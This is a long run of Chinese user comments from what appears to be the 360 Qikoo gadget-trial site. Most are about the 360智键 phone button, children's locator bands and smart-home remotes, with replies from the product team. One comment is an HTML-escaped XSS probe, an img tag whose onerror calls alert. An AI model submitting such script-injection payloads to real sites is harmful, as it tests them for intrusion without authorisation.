在淘宝下单买的，已经用了5天，东西还是不错。震动闹铃还是挺好的，很实用。看到自己的睡眠情况，但是不知道看了有设么意义，这一点fitbit的软件还是需要改善。总体来说，除了软件做的不是很好以外，其他都不错。
高级产品啊！！！！！
果然解放了操作 更加方便啦
WIFI破解利器这个想法靠谱！不过只限于公共网络
拍照功能大爱 哈哈 我手机默认的相机总带有声音的，，
赞一下，评测很细致，就是手机截图太大了，期待继续更新
一看戒指就知道啦
这个评测怎么没有图片啊
后期处理大图，图太大，与小清新不匹配啊，偷笑。
后期处理大图，图太大，与小清新不匹配啊，偷笑。
后期处理大图，图太大，与小清新不匹配啊，偷笑。
卡住了，连续发出三条。汗了。
小小智键，发挥空间很大。
这网站好酷啊，看到前几期的，也好帅啊。支持啊，真是100%免费吗？
自己为自己顶一下！！！
孩子安全当然是最应该考虑的 手环其实也是为家长多份保保障
哈哈，我是测评类的奇葩！
图片走下角怎么还有一个印章呢 不会是楼主自己定制的吧
其实紧急呼叫这个还是有一定作用的
很专业哈 果然是软硬件结合~
作为一名忠实的粉丝，想要说的东西太多太多，但是由于申请页面的篇幅所限，许多时候想要表达的东西都不能完整的表述出来。建议能否将限制字数稍作扩大，这样就可以充分容纳所有粉丝们的建议和良言。另外，可否告知贵站的联系方式，方便有诉求的用户可以在第一时间联络到需要的人，将一些突发的奇想或是好的点子及时传达到位，不至于到了留作遗憾。感谢奇酷网，感谢360！将继续支持，关注网站的所有动态。
这个可以直接发邮箱呀：qikoo@360.cn 
非常喜欢上网 我想拥有他
能送我用用吗
嗯 大家集思共享才会让手环做的更出色 但每个用户的声音其实都是对产品的支持哈~
按照360的一贯作风 肯定要将免费进行到底 为人民服务哈
骨传导不错，支持！
用这个还交闭路和其它费用吗？
真心喜欢，很赞！
图可以改的小一点。写的时候可以调整
但是还要赞一下。
看来不错。有没有数字音频输出呢？
看来不错。上市仍是遥远
申请一个！
申请一个！ 
申请一个！ 
申请一个！ 
感觉拍照更方便了！
真的吗？？？如果可能我也想试试
一直追求智能生活，因为目前也是在从事这个行业，也一直关注着智能产品的市场，上次订的360随身WIFI也非常好用，家里也安装了部分智能产品，所以更期待这个产品的强大功能，也来抢抢看，希望幸运大神能降临！
有卖吗？给个链接·谢谢了·我的QQ845436212
感觉很方便，可以拍到其他能拍到的地方。
不是…是有线耳机，特别是我们这样用有线耳机的把智健拔来拔去的，很容易找不到
360智健外观和别的产品差不多，小巧，类似防尘塞
还有个问题，在我用老婆的移动版htc one的时候，插上智健后，部分功能会被显示被占用，无法使用，她手机没有root，用的是360桌面，被占用的是智能相机，闪拍
电池能用多久？
你们还有会员卡：）
谢谢各位的评论！明天星期六宝宝外出让他在陌生地点看看效果：）
顶起，支持04，支持360.
谢谢啦。嘿嘿
这个真有哦。
上班搞测评，小心被老板一键录音。哈哈
期待上市啊 
专业用户呀 哈哈
智键君这个蛮不错呀..
行啊007，你写的不错啊，唉，我啥时候才能有个智健，我也是360的忠实用户
希望可以赶紧有得买
很不错的产品             
很不错，就是功能不多       
你的是发的什么快递，到哪里？用了几天时间啊？
相对男人来说，大小还行
看来定位的范围准确性还是一个问题。
这个大的女孩也能带上手环啊。
聘书还不错。挺有意思的。
好喜欢，可惜买不起
啊 表示用ip4s的用户被鄙视了-_- 
相当专业的评测报告，建议拆的更彻底，哈哈
产品优化指的是？减少进入程序的延迟时间？那个慢的感觉很明显咩？
经典，值得推崇，
传递失败是什么情况？就是无法定位么~~
这个建议好啊。奇酷网得多关注。
MX3不能用吗？希望360尽快完善，毕竟魅族的用户还是很多的
我得到过百里挑一的中签。没有花一分钱。但是还是需要运气和坚持的。
是啊。小编觉得拆的还不够彻底呢。再好好修改一下，可以评精彩报告了
还没用呢，就给拆了啊。真猛。
智妞。哈哈。这个词挺搞笑。
lz写的很真诚哇~~小小智键也能给人带来幸福感~
好袖珍，喜欢
好神奇，刚申请了试用
对于一直对智能产品钟爱有加的我来说，BroadLink RM2这样的产品马上就能够迅速成为我家中的智能控制中心。尤其是看到在这一代产品中新增了定时和射频遥控等功能，那就使这种智能控制变得更加便利。我期望能有一台这样的设备，能够实现我智能家居的梦想。
这个拆完还能装回去用么？
人“智键”则无敌 哈哈 
有没啥用智键拍的照片？ 晒一晒呀
朋友挺好用的，不是夸张，到手后就狂点。差不多有百下了。不过都是反应迅速，没有空按的时候，不夸张。我是手机几乎不离开手的，我又不是拖，亲自体验的。
兄弟，我用的也是MX，四核的，智键能用啊，插的时候不要按智键！！
哦？手电筒不方便关闭是什么情况？Lz说详细点呗，没领到免费试用的想观望下自己买一个捏~~
谢谢评论，我回去再试一下！
很不赖的感觉 在超市的时候会不会被认为是超市那个物品锁
在激动地心情中试用着，等待接下来的评测
最细腻2K屏幕手机
最细腻2K屏幕手机!
我希望早日能有一台.不知哪里购买。
赞一个！测评很专业嘛
OPPO Find 7 手机屏幕真的挺细腻!
赶紧出来 来一个
由于手机像素太次，就不上传了。呵呵。怕影响智键的声誉。见谅。
奇酷组织个团购哇，折扣折扣！
 FunBox 电视盒子 真不错!
这个你查下 设备参数
这个手机很清新啊。
双击键确实应该优化一下。很有价值
期待呀 有没试用可能？
下次应该会有你啊。加油，你的安仔到了吗？
期待功能升级，你的名字好有趣啊。
嗯是的，后期应该会升级，你期待什么功能呢？
外形都比不上我的vivo 3xt，真心希望能改进，虽然我不使用也不拥护苹果5s，但它的外形设计简洁，酷毙了。希望咱们的设计师应该多参考多学习。
123123213
12312321
12312321
怎么还是创意中!!!
kuai  a  kuai a !
又是创意中&lt;a href=&quot;http://www.qikoo.com&quot;&gt;qikoo&lt;/a&gt;
现在看来电池电量是最大的弱项啊 
祝贺楼主，可惜想体验没机会啊！
不错，很有实用价值、
一个防止手机灰尘进入的东西，
才一个天线
如果不超过2000RMB的话可以考虑考虑
表带不怎么好看
写的真心不错。还给自己打了广告。哈哈
感觉这个手表很不错。
这不跟索罗威尔差不多嘛……京东就有卖的了。一万多……
求救啊，报告提交不上，不小心一按把默认的发了
运气不错 恭喜了     评论不错
请问提交按钮没反应怎么办
终于行了~泪目
今天刚收到，然后在整个单位显摆(*^__^*) 嘻嘻 就直接说 看我的 手机（我用的红米，没有这个功能） 可以背后打开软件 他们不信 我就偷偷用手按360智键 你看 哈哈 当时他们的表情 笑死我了 后来给他们介绍 竟然没有个知道 这小小的插头会有这个功能
你去Kickstarter看看~
土豪金用户毫无压力 :D
大人带应该也毫无压力吧 哈哈
这种小尺寸的图片看起来还蛮舒服的..
还是创意中， 好期待!
还是创意中， 好期待!
女生可以带
嘻嘻，那不是广告了，交朋友呢。
妹子的试用报告，很细致，赞一个！
不错呦   一会也评测一下                           
好想来一台！！ 这不就是迷你版的tesla吗
亲，你先用耳机的 线控试试能不能用，如果是硬件问题，找奇酷更换一个吧！
期待，早日上市
赞一个，写的很不错
什么时候能见到产品？
这个决定是懒人的一个巨大的福利我喜欢！！@！
长按关机这建议不好吧 误关机怎么办
这个圆形设计简直是经典中的经典啊！！！
颜色不好看啊这个
Slimo无线充电贴片 好高级!
Slimo无线充电贴片
这个好漂亮哇 喜欢
我觉得保护自行车估计没戏，大不了人家拆了你的自行车。。。
低龄高富帅的选择！
想要~~就是太贵啦
应该可以换刷头吧
谢啦！！你多尝试申请，总有体验的机会的。
设计是没说的，希望价格适合大众消费
智能硬件快到碗里来
啥时候正式开售啊。。。都等的花儿也谢了。。
排版很不错啊~图片的大小正合适
虽然申请了试用但是不报太大希望总感觉是骗人的
哈哈  应该的
碉堡了，我都舍不得
图片要上传的呀 直接粘过来显示不了，，
果然很不错的体验        
算了,不解释了.
你还期待什么功能呢？
你还期待什么功能呢？
期待啊，申请完了，不知是不是幸运的那个
 OPPO Find 7：最细腻2K屏幕手机
 Broon：配备 Android 平板的电动车
Moto 360 智能手表
呵呵，听起来很友爱的！期待！ 
爪机是p6么？我也想要使用的机会啊
因为是限量版，情侣款~既然是买来给妹子的那还差这几块钱了吗哈哈
好妈妈~~不过你把你儿子给贴出来，万一被酷友们的女儿相中了咋办。。。
因为是限量版
赞一个！很棒！
河南，EMS，19号收到短信，20号就收到了
谢谢啦，希望以后能有更多试用机会。
呵呵，360真酷 
呵呵，360真酷 
期待呀 有没试用可能？
太贵了，土豪的玩具
价格有点高，另外杯子的材质是否能承受热水？
360 智能手表 不错
 Android 平板的电动车 款式好看
无线充电贴片希望早点出来，肯定火
好，这创意好
其实我们当今主流的发展方向就是智能化家居，各大硬件厂商和互联网公司都在努力推出自己的具有影响力的高科技产品。但是智能家居的切入点究竟在哪里，有没有一种切实可行的方法将我们生活中所用到的全部设备整合起来？这的确是需要深思的问题。BroadLink RM2这款产品将有可能解决上面的问题，我们可以通过手机进行远程操控，还可以根据情景模式自行启动需要的服务，的确不失为一款贴心的智能化管控中心。支持奇酷网！
我也抽中了。今天刚收到。目前还在摸索使用中。
我想拥有他，好东西
这遥控功能肯定好，能解决遥控问题，好
嗯，这是个好方法，多谢提醒！
安逸蛮，好东西
真是好东西，但是首先要有车。。。。
没有得到试用名额，希望下次有机会。
希望可以抽到我 ，太期待了~
奇酷网的东西真是太高科技了
你的意思是再加个USB接口插电脑
写的这么用心，1L一定是我的，雅蠛蝶~
此配置是非常非常吸引眼球的！2K 5.5寸屏幕 2560*1440分辨率，如此细腻的屏幕手感加视觉体验一定好到极致！VOOC闪充听起来酷极了！这是解决智能手机最大短板的绝好途径！好想入手一台，就是米有点不够，目测售价应在3K以上。顶一个！
使用过程的图片多少还是要有些的
是华为mate的说
用耳机试了，是可以的，应该是硬件的问题
我已经把报告修改了，把复活后的内容加入了，小编觉得如何？
好想要 ，好强大
太期待了~ 高科技了
好像说闪拍的对焦有点问题！
额。。这也太简单了吧。。就这样么？
这个对比大小的好有创意啊
快闪灯？那是啥呀？
聘书上本来就没有编号呀，编号不是在卡片上么
278号试用官你好 写的真不错啊！
自己抢自己的沙发太可耻拉！
不错 不错 速度好快啊，要是我也中就好了
好能写啊！佩服 佩服！！
关键是卡片我也木有。。
你的手机是啥型号的啊？
雅蠛蝶~雅蠛蝶~
啥时奇酷能来台做试用呀 好帅~~
就是 我每天都来看..
期待啊...
Touch能用吗？
 我很期待啊 
这要看手机吧
现在500万像素的手机很少了吧
好多的改进建议啊。不错。
有没啥一键拍的图  哈哈
嗯 赞同~~
真希望赶紧上市买一个！！
啥时能让我买到呢..
以前的，嘿嘿！！！ 后摄像头大多1300万了  = =
Thanks！！！
多拍几张图啊，，
建议不错 哈哈
哈哈 要给男生带才对,,安全卫士
照片拍的好清晰呀~赞一个
很用心呀 赞！
这个很专业呀 赞！
对于三星的产品研究很深，而且身边大部分人受到我的影响都买了samsung手机和平板电脑，特别想尝试一下它最新的指纹解锁和心率测试，不过内存容量相比之下比Note3要差一些，希望在ROM方面得到改善  
对于三星的产品研究很深，而且身边大部分人受到我的影响都买了samsung手机和平板电脑，特别想尝试一下它最新的指纹解锁和心率测试，不过内存容量相比之下比Note3要差一些，希望在ROM方面得到改善  
对于三星的产品研究很深，而且身边大部分人受到我的影响都买了samsung手机和平板电脑，特别想尝试一下它最新的指纹解锁和心率测试，不过内存容量相比之下比Note3要差一些，希望在ROM方面得到改善
霸气啊，有木有试用啊，哈哈
中了，哈哈哈
智键拍的效果还不错啊，图片再多一些就好了
长按、双击，这些动作应该都定义一下，玩法可以有很多啊
闪拍的问题希望能够尽快解决啊，拍照的需求还是很强的
一键紧急拨号这种建议应该多提一些。不错。
赞同，一键拨号确实有需求
听说闪拍的对焦有问题，但是这张确实拍的不错
这个小东西确实不错。定价不高肯定有市场。
确实是。看来还有很大的发展空间啊。但是现在这样已经能满足我很多需求了。
哈哈。还自己DIY了很多花哨的东西啊。
看起来高大气上档次
挂绳确实可以考虑，挂在耳机上就最好了。
好看，但不知道开起来怎么样？
好大的一根智键啊。哈哈。最至高无上的荣誉给你们----智键团队！
闪拍貌似功能还行啊。
评上精品了啊。恭喜一下啊。果然很用心。
靠谱啊。孩子的安全很重要啊。
当然能！不然就不敢拆了！
已经用了一天了，况且现在已经把她复活了，而且是满血的。
牺牲我一人，成就千万家，极客精神就应该这样。
无敌吧！智妞不错！
评测内容充实，一点一个步骤，期望再细细评测。
有人说不支持极路由！有谁知道到底支持不支持！
今天收到了邮件了！里面什么都有！唯独没有智键！！！！我怎么那么倒霉啊！不会是小编忘了吧！！！现在该怎么办啊！！！没有收到，却还要写评论！这个怎么写啊！！不写的话，会被认为不诚信；可是我真的没有收到啊！！！谁能帮帮我！！！
贡献自己的一点想法，这个能力我还是有的！哇哈哈！
我觉得对我们外出执法，监督执法是有帮助的，希望能普及到各个执法部门。视频可供社会监督。
功能好强大，好想做代理，这设备一定火 
o(*////▽////*)q  第一次發評測，搶自己的沙發。
华为c8813q，刷机刷成小米的了
高大上啊， 什么时候能卖啊，该给我闺女买个玩玩！！！
它可测PR量？咋测呀？
通知栏应该增加排序功能！
试试白天抓拍效果吧
有幸中奖兴奋，试用了一下，不管用，不知道是不是手机不兼容，六日换老婆的手机再试试
老人能带的话成年人就都能带 你觉得会出吗
我擦， 这是开BUG的节奏呀！！！
我感觉这个东西太给力了。
什么时候能量产啊  等不急了
支持一下吧                                                                       
好，鼓掌。啪啪啪啪~~~~
怎么没人跟我一起鼓掌啊！
人家写这么认真都不鼓掌！
你们有没有良心了！啊？！
喂，还有没有人了。
看来这里是停尸间啊。全是尸体。
算了，我不说了。 我走~~~~
都没人看？
都没人看？ 都没人看？ 
一看就是妹子吧。这么关注外包装。
楼主这是啥手机啊。
高端大气上档次的神钉
难道外包装成了硬伤？哈哈
居然还有动态图。哈哈
哥们。你研究的挺细啊。参数都研究了。
中了？还没公布呢吧。哈哈
一个高科技奇特的酷品网站啊。。。。
不知道这次会不会中呢？
&lt;img src=foo.png onerror=alert(/测试/) /&gt;
键君偷偷的告诉你！太赞了~谢谢你对小小键的肯定和支持~
一键截屏确实是个好需求。
估计360的路由器会很简洁，想随身wifi一样好用。
估计是系统版本的问题。
你显摆的很成功啊。哈哈
期待试用体验报告哈
智能机价格最后都会降到三千下 除了苹果
这个挺不错。不知道定价如何。
这个应该搞试用 看着太酷啦
跟360原来没关系呀 啥时也出一台？
键君的目的也就是要给用户一键直达的快感哦~感谢对小小键的信赖~
外形上我们会不断改进，我们的小小键也会越来越漂亮的~
我们会推出更多更强大的软件的，也会加入一键定位，截屏等功能，请期待哦~
对，因为智键就是模仿耳机线控的，所以会有没有声音的问题，我们会尽快修复。 小情话，也要不要让智键君听一听呢~哈哈~ 能给用户带来方便，也是我们最大的初衷~感谢支持
啪啪啪啪啪，鼓掌~感谢亲的反馈哈,希望小小键你会喜欢~
昂？你去微博反馈下问问咋回事~~
我们的外形会有改进的，要相信小小键一定会越来越好看~
一键息屏和一键亮屏的快捷，我们接下来的版本会有的哦~
智键君都不回复我的报告，雅蠛蝶~
谢谢支持！我们在不断的完善和努力当中哦~~~
一键录像我们也在开发中，自定义的软件也会增多呢，感谢对小小键的支持
哎哟，手机屏幕听好看~智键君听到你的声音啦~希望你会喜欢它使用它~有什么问题欢迎反馈哦~
好用的话~欢迎推荐哦！（鼓掌鼓掌），你的喜欢就是智键君最大的动力~
（哭）我明明是智键君，就这么硬生生改了性别。延迟的问题，我们的软件不断更新，小小键越来越快的！
智键君也好激动好激动好激动~（淡定）平板电脑目前还不支持哦，不过以后会努力开发的~感谢亲的反馈
歪粉见歪粉，两眼泪汪汪！（握爪，我也是歪粉我会乱说？）
图拍的很专业嘛~键君很感谢你反馈的这些问题，你的建议就是我们努力的方向。要相信智键会越来越漂亮，越来越实用。！！！！
连夜测试，还配了这么多图。键君真是好感动（都别拦着我，让我哭一会）！谢谢对小小键的肯定，我们会不断努力的~
现在隆重宣布，小黑和小白皆为夫妇，请新郎新娘交换小小键，并许愿终身为JOOSS服务！ 好有创意的反馈呢~哈哈~
感谢亲的反馈哈~要相信我们的小小键会越来越漂亮的，建议也很实用，软件商我们会修复一些BUG，请及时更新我们的APP哈。小键君去上海玩儿了就找你去~thx！
小小键容易丢失，我们也正在设计它的“家”，感谢亲的反馈~！
想要，考试我10岁，年龄不知够不够。 
四百多，好贵。
键君感谢您的反馈~闪拍因为我们基于快的因素，所以是有模糊的现象存在的，但是在白天只要手不抖的情况下，相片的清晰度还是很好的，有用户反馈过，拍出的相片效果不错哦~
在论坛已经看到啦~
棒~你的想法很有创意哦，我们会努力让智键的功能更加强大的~
反馈已收到~在用户体验和外观上我们会改进，会努力方便用户使用的~
智键有哪些地方需要改进的您能提出一些意见给智键君么？
看到最后一句，直接鼻酸了。感谢亲对智键的支持和对我们团队的信赖~智键能你的生活带来方便，就是我们最大的动力。
对智键的外包还有待设计优化，正式上市的时候，我们会给他准备一个&quot;家&quot;。蓝牙耳机的创意很赞喏~土豪金智键也会有的，请期待我们的产品啦~感谢亲的反馈
写的太赞了。我们智键团队会不断朝着大家期待的方向努力的！~
一键截屏我们以后会有的~小小键同学以后也会越来越好看，个性化的~感谢亲的反馈~
反馈好及时，试用报包写的也很赞！我们会在耳机上有所突破的，让大家更方便的使用~
这么多想法和意见，写的还这么认真！手动点赞！收纳套也会解决的，还有闪拍的问题呢，我们也在优化，还有关于拔出的那个BUG呢，我们也正在修复当中咯~感谢谢耳朵~（还真是很严谨呢！！！！）
延迟的问题我们的软件在进行优化，也会增加更多自定义的选项的，快门声可以关闭啊，设置一下如果不能关闭的话，在系统设置里再设置一下。
智键会越来越好看的~相信我们，期待正式的产品哦~
问题都很详细呢，衷心感谢亲的反馈~很多问题我们这边在优化当中哦，希望给用户带来更好的体验。
我感觉只是把表带加长点 这样没什么技术难度 我注意了下现在大街上关于老人走失的寻人启示太多了  个人感觉老年人更需要这个手环！
希望小小智键能给你的生活带来一丝丝惊喜哦~
呵呵  朋友  我发现你很非常关注这个手环啊~  你是第一个发报告的  然后基本每个报告你都仔细的阅读并评论   前几天收到手环后忙工作去了  昨天才抽出时间来冲冲忙忙的写了报告
在外观设计上我们在不断优化当中~小小键会越来越人性化的~ 谢谢亲的反馈，因为是模仿耳机线控的，所以和音乐播放还有些问题需要优化~请及时更新我们的APP哦~
感谢反馈哦~很棒~！一键定位我们正在研究当中！希望小键能给你生活带来很多方便~
感谢亲的意见，在兼容性，灵敏程度和蓝牙耳机冲突的问题，我们正在不断努力的修复和优化~
一键挂电话的创意不错哦。还有定时切换的建议。我们会不断改进和完善的，感谢对智键的大力支持！
小小键用的可否称心？哈哈，外观我们已经在努力了，希望能给你生活带来方便哦~
感谢百忙中亲的反馈~卡顿的问题呢我们也在努力的解决中哦~
看着真牛气，不错。。。
我已经排队到了6359
回形针~太有创意了。APP我们在不断的优化和完善当中，界面风格我们也会不断的创新的，感谢亲提出的意见和反馈哦~
300美元。智能空调。价格还可以。
赞gif 报告写得好用心~ 我觉得这个手环的功能的确可以拓展。但是针对不同人群的外形可能就不一样。老年手环可以设计的更低调实用一点。小孩儿的手环就像这个电子表一样挺好看的~
这个很实用！
我怎么抽不中呢
好多中肯的建议。
用的很顺手是不是，小小键给你生活带来的方便有木有！哈哈哈，我们的正式产品会有更多更强大的功能的，感谢对智键的支持！
闪拍跟我一样的问题
播放器的问题呢，我们这边的APP正在优化当中哦！让键君去听听《不再联系》，不过你要跟键君常联系哈~
我也是小黄人的死忠哦哈哈~意见我们已经收到啦~ 反馈很赞~写的很认真，都来给妹子32个赞吧~
我们在外观上还会努力的，智键也会越来越好看的~
期望中奖....
在手感上我们会不断努力更新优化的，感谢亲的反馈建议哈~
我也是。。。
感谢你的反馈，希望你能喜欢智小键~
智键君会不懈努力的！感谢亲带来的反馈~
哈哈，希望能给你的生活带来很多惊喜啦，这就是智键存在的价值和意义！
触感我们在不断努力的研究和开发~希望能给用户带来多多好的体验~
排版很棒啊~工程师正在努力开发出让大家更满意的智键，感谢反馈哦亲~
外观上的设计我们在努力当中哦，谢谢亲的反馈，请相信智键会越来越好看的~
闪拍很多人反应都不错呢，亲可以看看其他用户的反馈，不过为了追求快，会有一些模糊的问题。谢谢反馈啦~赞一个~
我觉得老人用的话就改下颜色 比如黑色、白色就低调了  
对于重度游戏玩家，一键清理有没有很赞呢，哈哈~这也是我们希望能给大家带来方便的地方哦~
手电筒不方便关闭？是要点开应用才可以关掉么？
感谢反馈~
外观我们还会继续努力的~请继续支持我们的小键键哦~
你的三C会有闪退的现象吗 
用智能键，会频繁弹出窗口吗 
安全性这边我们在不断的加强~感谢亲的反馈哈~
外观上我们在不断努力改进哦，我们的产品会越来越漂亮哒~我们也很感谢亲的反馈，小小键给你带来的便捷就是对我们工作最大的肯定~
一键锁屏的功能以后会有哒~感谢亲对我们智键的支持哈~自定义功能也会增多的~
感谢亲的反馈哦~智键是不是很赞呢，我们会越来越好的~
已经被我们选为优秀反馈在论坛帖出了哦~
智键君看到你的报告啦~感谢对小小键的支持，双击和超级模式看来大家都很喜欢呢，闪拍这边我们还会不断完善滴~
感谢亲对智键的信赖，我们会努力，以后会有一键开屏，一键截图，一键接听等等功能的~
感谢亲的反馈~外观上我们会改进的，闪拍因为追求的是速度，所以对焦无法满足，不过我们这边正在闪拍上努力。
智键君会不断努力创新满足大家的需求的~感谢对智键的支持哦~！
已经到了，你的安仔到了吗
已经到了，你的安仔到了吗
主动报警。这个功能也不错。
智键君感谢亲的反馈啊~“居家旅行、送人之佳品”哈哈，不错不错~能方便到大家就是我们开发这个产品的初衷~
拍到的MM也跟智键君分享一下好不呢！╭(╯3╰)╮建议太赞了。我们会更加完善功能的。
智键会越来越好看的~亲们耐心等待哈~说不得还有土豪金色的~
写的真不错，好幸运啊
这个报告总结非常有条理啊。赞一下。
非常期待，要是可以扩展电池或可外接电池就更完美了
何时才能发布，是不是要等小米发布了，这家才会发布
这个体积还能再小点吗？
实践和各种尝试很重要
近距离报警这个意见不错啊~孩子刚走丢就能有提示~
这个使用范围有多大？电池能用多久？
未来不是梦。我们也在向大家提出的建议靠拢，可以告诉那位撒娇的女同事，不偏心哈~要相信我们的小小键会越来越漂亮的~感谢亲的反馈！
那么灰心？我是N.159试用官，嘿嘿，你这个心态需要调整调整，如果你肯付邮费的话，我可以把我刚使用完了“360智键”发给你。同时，也祝福你好运，希望幸运女神光顾你。
我家窗户没留口
这个试用名额能多点儿吗？现在二胎好多好多了
这个有没有Android版的？急需入手……非常期待
只要价格适中，这个肯定火
家里貌似除了电视、机顶盒、空调这些之外，真找不到几件可供遥控的电子产品，就不申请了，把机会让给需要的小伙伴，坐等观看大家的测试报告。
非常好的建议哦， 每一条多很赞
在锁屏状态下，使用闪拍确实会卡的。大概两秒钟
用手触摸智能键的感觉，主要是指***机身之外，也就是露出来的那部分
我愿意付邮费,,,寄给我可好?
我敢保证这次肯定不会选我！
看起来很不错的样子！！！！！1
有时候闪拍启动不了。
好帅哦!好像要啊，有没有的买啊。
选我没错对不对！
选我没错对不对！
Thank you very much！
@忘事大大王 @BEINE @蚂蚁_晓晓 @笨笨3602213 @舍得1970 @游离者1 @dongzi_2012 @等饵的鱼儿 @kawin3 @Ubuntu版   @站帅帅 @大辣椒亲王 @minyihot @360_milton77  来评论下- -#
能否在论坛帖子中帮我加上此测评页面的链接，因为我的级别加不进去，有些网友说不能完全看到，可能是因为图片太多了，谢谢！
倍感激动啊，亲亲
好的，保证继续关注。
我没有安仔呢。
图片就一面
是我自己加的水印。
最近有点小忙，没来得及写文字，周末肯定要完工的。
自已顶一下，呵呵
板凳也是自已的。
嗯嗯，希望你们再接再厉
感觉很实用！对于那些像素差的手机
看外表就知道很高端大气上档次了！
还可以啊！就是稍微有点贵
解决问题了吧
解决问题了吧
太棒了，弱弱的问一句，有高中生用的吗？
弱弱的说一句，其实这东西早玩过了，就是材料有限，外观上不了台面，只敢在家用用
考试开bug的节奏
看起来很高级的样纸
价格合适我就买
非常喜欢，经常拿错遥控或者直接找不到了
辛苦所得，必须沙发
那卡什么卡联通的吗，可以打电话吗，问问里面有多少钱，什么套餐 
搜了下，京东有卖
价格不贵，就是不知道制冷效果怎么样。这个视频介绍没有中文呢，听不懂。。。。
考试上的外挂神器，生活中的必备良品！
梦想中的产品OAO
+什么时候出啊？好像要！ 
太coooool了
为我研发这款产品真是辛苦了
购买按钮在哪儿
非常的期待
很有趣的小东西啊
这个东西神奇了！！！
智键君终于看到我的了
非常期待这个遥控器，家里遥控器太多了 
运到中国起码价格要翻到四五千块，高端大气上档次啊
长按关机,个人建议还是比较需要，主要是为了那些担心真正HOME键有损坏的人，虽然修一下也花不了多少钱，但是定义了HOME键，就要做到HOME键的功能。
我的母亲是个残疾人，有时候想接电话，自己的脚也不方便，那个时候真的很无奈，而且他的手机的功能不是非常强大，所以我希望能加入这些功能，我感激不尽
麻烦大家看见默默评论给我动力~   一个个字码的都是真情呀。
挺不错的建议，很感人哦，很有孝心。
评测的很详细！
是呢，只是我的闪拍不大稳定，有时候清楚 有时候不清楚。或许是我手机的问题吧。     -来自 猎户座M78星云光之国奥特曼之王***土豪镶钻一般人买不起版 HTC  ONE  （中国移动）
奶粉桶？？？
我很喜欢这个小东西实用，真想以后操作手机只需要一键就搞定！
体验报告已经完成，求加精。
你们想买就能买呀，肯定与大陆市场无缘，这是不用说的。想买的到时多加几百海淘去
很用心的评价,态度很好,对我帮助很大!谢谢.
你看看是铁的吗，用磁铁试试
我用原装的线控耳机插入，选择智键，然后我用耳机的按钮竟然能够行使智键的功能。 具体哪些
按起来费劲吗
小米不是有智健门吗
快出来！！！！ 
贴主哪的。快递这么快 
插起来方便轻松吗
那本子好熟悉
家里有很多遥控器。
几时预定的 
一分二有用吗
闪拍可能没对好焦距，拍第二张可能好点
用金属会很好看
为啥你的却加了爱你的，
你的非君而是妞哦
淘宝有的哦 
淘宝有的哦 
怎么还有智键妞，这么多是你一个人签名的吗
插头怎么不一开始就镀金呢，哪怕是镀铜也不错啊，现在很多耳机镀了金诶
不解锁就拍照会亮屏吗 
跟耳机插头的对比。。。完全一样的接口，镀金就更上一层楼了   谁是052倒过来啊      谁是000啊
桌面的图标感觉颜色上不大好
话说怎么没看见NO.001的
文艺青年哦，，，，，我的流量。。。月底了
果然用小米的脑残多 还全部打最低分
不会哦。。。亲
小恩  谢谢赞赏。。。。
来嘛，给32个赞噻。
我为什么也没抽中啊，给我们个机会好不好。 
很用心。。
我自己用的就是iPhone 看起来好酷 希望能试用
佩戴一周后就会自动学习识别安全区域..不用担心 
以后能否试用都来个投票吧 投票多的就让奇酷联系厂商做试用如何？哈哈
一键控制全屋家电,神奇呀
我们可以通过RM2在清晨自动开启窗帘，并打开音箱播放音乐，开启电视收看新闻；还可以在手机上收到来自冰箱的通知：您的牛奶库存已低于警戒值，请及时补充！离开家后查看有无未关闭的电器设备，开启扫地机器人使其开始工作，甚至可以打开配有红外功能的监控设备；在回家的路上提前打开空调并调节到指定温度，打开热水器启动加热功能，将水温控制在舒适的温度；晚上手机还会收到通知：您家里的门没有上锁，您楼下的车子已经锁好…
程序猿版果然很强！！赞一个
这个，，咋就这几句，，，
哇哦 这个图片评测太赞了！！
希望以后越来越智能 这个应该没问题的
多谢！每个人都会有不同的想法，站在不同的问题上思考就会有不同的结论。
智健门是啥玩意?
这个锁键的功能看真是有点需求呢
前面的配图很好哈  值得推广~
耳机控这个的确应该想个法子呀..
建议很详细呀 赞~
几点建议都很务实呀..
还不如xplay3s
嗯，确实不错！赞 ·~
锁扣接触可以设置两个金属点，形成一个回路，脱离后就断电就能及时的报警  这个注意很不错哈
一键控制家电
恩，这个不错
智能生活好强大..
据说是跟quirky一起合作的 感觉不一般啊
我的卡片上手写的智键妞呢，我还是喜欢智键妞这个名字。哈哈！！
这个更适合欧美人吧，毕竟亚洲人手腕没那么粗
这个好。    支持360 
很有质感啊
5寸以下的屏才差不多 无边框不喜欢 到时握在手上都碰屏幕
可以行使所有的功能，第二张图就是我用耳机上的键双击之后产生的，我已经试验了好几次了，每次都可以。
好想要，可以错过了活动，什么时候还有，好期待
好想要，可惜错过了活动，什么时候还有，好期待 
太棒了，支持360，希望可以得到试用机会
好高级，有点贵，承受不起
当初想要的功能现在全有了，赞一个
我也赞一个
为什么呢？
为什么呢？
非常好的建议耶
高端大气深刻 50美刀还可以接受~
嘿嘿。小情话是不可以给智键君听的。这是秘密噢。
我也是，哈哈
专业啊～！
图文结合 效果非常好啊~
SIM卡这个的确需要完善 实名制这个建议不错..
支持测评！
谢谢各位光临！
有道理啊！ 万一坏人把手环弄掉也可以报警~
这篇试用报告是我看到最好的一篇了。
你家宝宝几岁？表本身的实用性怎样~戴着舒服吗？
真的是高大上
完美的产品， 好期待！
现在的孩子真幸福
智能空气净化器 这么神奇！
不错的娱乐玩具
有这么神奇吗？  谁能告诉我
感觉家庭监控系统还是很有帮助的
这套大概多少钱呢？国内有没啥类似的产品
超級貴啊，再說充電真的很不方便
谢谢支持！
谢谢支持！
谢谢支持！
谢谢支持！
谢谢支持！
绍兴，是挺快的，上周四傍晚就到了单位，周五早上上班去门卫取的。
期盼着快上市吧， 很期待！
外边应该是塑料的吧！里面应该有金属，我没有内部拆解。
健康监测的 iPhone 手机壳
哈哈， 娱乐生活 
well well
评论的很全面啊~~
手机壳还能检测健康？
很期待！！！
嗯不错。。。
猿主就是不一样啊，看问题的角度不同与一般的消费群体
well well wello!
hello  well mr
健康监测的 iPhone 手机壳
Android 平板的电动车  好神奇！
 Light  in  the  box
模拟的几个场景都挺酷的。尤其是录音领导讲话。哈哈。但是***神马的还是算了吧。
越用越好用啊。
在这里呼叫管理员与程序员，东西非常强大了，希望更加的强大。例外也非常感谢还寄来了一个随身wifi虽然我以前就买了一个，还很好用，有36T的空间。很多人说没管理权限不能用。其实这个很简单，再新建一个账户就什么都解决了，当然了你要是电脑高手，把C盘的权限设置一下也可以用
但是感觉这个空调的外形太一般了吧。
